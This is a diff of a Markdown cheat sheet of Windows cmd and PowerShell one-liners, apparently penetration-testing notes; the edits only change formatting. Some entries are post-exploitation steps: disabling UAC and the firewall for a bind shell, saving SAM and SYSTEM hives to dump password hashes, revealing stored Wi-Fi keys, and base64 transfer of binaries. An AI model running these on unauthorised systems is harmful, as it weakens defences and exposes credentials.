 ```
 
@@ -1284,13 +1362,13 @@ C:\> schtasks /query /fo LIST /v
 
 #### Display the "Stored User names and Passwords" window
 
-```text
+```
 C:\> rundll32 keymgr.dll,KRShowKeyMgr
 ```
 
 #### List namespaces & classes in WMI via PowerShell
 
-```text
+```
 PS C:\> gwmi -n root -cl __Namespace | Select name
 
 PS C:\> gwmi -n root\cimv2 -li
@@ -1298,7 +1376,7 @@ PS C:\> gwmi -n root\cimv2 -li
 
 #### Convert Between VDI, VMDK, VHD, RAW disk images using VirtualBox
 
-```text
+```
 C:\> vboxmanage clonehd myvdi.vdi myvmdk.vmdk --format VMDK
 ```
 
@@ -1306,13 +1384,13 @@ C:\> vboxmanage clonehd myvdi.vdi myvmdk.vmdk --format VMDK
 
 **csv to xls example**
 
-```text
+```
 C:\Projects> forfiles /S /M *.csv /C "cmd /c ren @file @fname.xls"
 ```
 
 #### List IPs of running VirtualBox machines
 
-```text
+```
 for /F %i in ('VBoxManage list runningvms') do VBoxManage guestproperty enumerate %i | find "IP"
 ```
 
@@ -1322,13 +1400,13 @@ for /F %i in ('VBoxManage list runningvms') do VBoxManage guestproperty enumerat
 
 #### Enumerate packages with their OEM .inf filenames
 
-```text
+```
 C:\> pnputil -e
 ```
 
 #### Install a driver package using .inf file
 
-```text
+```
 C:\> pnputil -i -a path_to_inf
 ```
 
@@ -1338,13 +1416,13 @@ C:\> pnputil -i -a path_to_inf
 
 #### Windows Nano Server APIs
 
-[https://msdn.microsoft.com/en-us/library/mt588480\(v=vs.85\).aspx](https://msdn.microsoft.com/en-us/library/mt588480%28v=vs.85%29.aspx)
+[https://msdn.microsoft.com/en-us/library/mt588480(v=vs.85).aspx](https://msdn.microsoft.com/en-us/library/mt588480\(v=vs.85\).aspx)
 
 ### Start a Wi-Fi hotspot using cmd.exe
 
 Open cmd.exe in admin mode
 
-```text
+```
 netsh wlan show drivers
 
 #if Hosted Network supported: Yes
@@ -1360,7 +1438,7 @@ netsh wlan show hostednetwork
 
 #### Disable UAC via cmdline
 
-```text
+```
 C:\> reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\system /v EnableLUA /t REG_DWORD /d 0 /f
 ```
 
@@ -1368,44 +1446,44 @@ C:\> reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\system 
 
 Useful if you have a bind shell
 
-```text
+```
 C:\> netsh advfirewall set allprofiles state off
 ```
 
 #### List Missing Updates
 
-```text
+```
 PS C:\> (New-Object -c Microsoft.Update.Session).CreateUpdateSearcher().Search("IsInstalled=0").Updates|Select Title
 ```
 
 #### Export SAM and SYSTEM Dump password hashes offline
 
-```text
+```
 C:\>reg save HKLM\SAM SAM
 C:\>reg save HKLM\SYSTEM SYSTEM
 ```
 
 #### Convert Binary to base64 string to transfer across restricted RDP
 
-```text
+```
 PS C:\> [Convert]::ToBase64String((gc -Pa "a.exe" -En By))
 ```
 
 #### Convert Base64 string to Binary
 
-```text
+```
 PS C:\> sc -Path "a.exe" -Val ([Convert]::FromBase64String((gc -Pa "b64.txt" ))) -En By
 ```
 
 #### List services running as SYSTEM and possibly weak file permissions
 
-```text
+```
 wmic service where StartName="LocalSystem"|findstr /IV ":\WIN :\PROG"
 ```
 
 #### Check Bitlocker status on a remote box
 
-```text
+```
 manage-bde -status -cn <box>
 ```
 
@@ -1413,7 +1491,7 @@ Use `wmic /node:@ips.txt` & `process` alias for multiple.
 
 #### Export failed logon attempts
 
-```text
+```
 PS C:\> Get-EventLog -Log Security | ?{$_.EntryType -eq 'FailureAudit'} | epcsv log.csv
 ```
 
@@ -1421,45 +1499,45 @@ PS C:\> Get-EventLog -Log Security | ?{$_.EntryType -eq 'FailureAudit'} | epcsv 
 
 * List all ADS for all files in current dir
 
-```text
+```
 PS C:\> gi * -s *
 ```
 
 * Read ADS
 
-```text
+```
 PS C:\> gc <file> -s <ADSName>
 ```
 
 * Create ADS using text input
 
-```text
+```
 PS C:\> sc <file> -s <ADSName>
 ```
 
 * Delete ADS
 
-```text
+```
 PS C:\> ri <file> -s <ADSName>
 ```
 
 #### Run the Windows Assessment tool for cpu and ram and disk
 
-```text
+```
 C:\> winsat cpuformal -v
 C:\> winsat memformal -v
 C:\> winsat diskformal -v
 ```
 
-#### Port forward \(proxy\) traffic to remote host and port
+#### Port forward (proxy) traffic to remote host and port
 
-```text
+```
 C:\> netsh int p add v4tov4 <LPORT> <RHOST> [RPORT] [LHOST]
 ```
 
 #### Enable/Disable NetBIOS over TCP/IP
 
-```text
+```
 Step 1. Get Index of Network Adapter:
 C:\> wmic nicconfig get caption,index
 
@@ -1473,13 +1551,13 @@ C:\> wmic nicconfig where index=1 call SetTcpipNetbios 1
 
 #### Compact multiple VDI files across folders
 
-```text
+```
 C:\> for /F %i in ('dir /b /s *.vdi ^| find ".vdi"') do vboxmanage modifyhd --compact %i
 ```
 
 #### Full scan using WinDefender
 
-```text
+```
 C:\>"%ProgramFiles%\Windows Defender\MpCmdRun.exe" -scan -scantype 2
 
 Use #wmic /node:@ips process for multiple.
@@ -1487,7 +1565,7 @@ Use #wmic /node:@ips process for multiple.
 
 #### Generate 32 char random password
 
-```text
+```
 PS C:\> ([char[]](38..126)|sort{Get-Random})[0..32] -join ''
 ```
 
@@ -1511,27 +1589,27 @@ where /R C:\ ping.exe 2>null
 
 `Get-Childitem -Path C: -Recurse -ErrorAction SilentlyContinue | ? {$_.Name = $filename}`
 
-* you can use wildcards here for name and for extension \(e.g. `pass*` could match password\)
+* you can use wildcards here for name and for extension (e.g. `pass*` could match password)
 
-### Resolve IP to Hostname
+### Resolve IP to Hostname&#xD;
 
-`[System.Net.Dns]::GetHostByAddress('$IP').HostName`
+`[System.Net.Dns]::GetHostByAddress('$IP').HostName`
 
 ### **PowerShell 'Watch' Command**
 
 `while (1) { $command_to_watch ; sleep 5}`
 
-### Get WiFi Passwords <a id="246a"></a>
+### Get WiFi Passwords <a href="246a" id="246a"></a>
 
-First, you have to know the SSID of the access point \(AP\) to get the password from
+First, you have to know the SSID of the access point (AP) to get the password from
 
-```text
+```
 netsh wlan show profiles
 ```
 
 Next, get the cleartext password:
 
-```text
+```
 netsh wlan show profile $SSID key=clear
 ```
 
@@ -1566,4 +1644,3 @@ done
 
 
 If you like this content and would like to see more, please consider [buying me a coffee](https://www.buymeacoffee.com/zweilosec)!
-
